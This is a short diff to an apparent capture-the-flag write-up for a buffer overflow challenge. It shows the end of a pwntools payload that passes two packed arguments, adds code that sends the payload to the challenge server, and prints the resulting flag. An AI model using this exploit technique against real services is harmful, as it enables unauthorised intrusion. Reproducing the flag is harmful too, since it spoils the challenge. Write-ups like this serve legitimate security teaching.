@@ -102,7 +102,12 @@ payload += pwn.p32(0xdeadbeef)  # argument 1, -0x21524111 in 2's complement
 payload += pwn.p32(0xc0ded00d)  # argument 2, -0x3f212ff3
 ```
 
-Sending this to the server, we get:
+And send this to the server:
+
+```python
+server = pwn.remote("1.2.3.4", 5678)
+server.sendline(payload)
+```
 
 > HTB{0ur_Buff3r_1s_not_healthy}
 
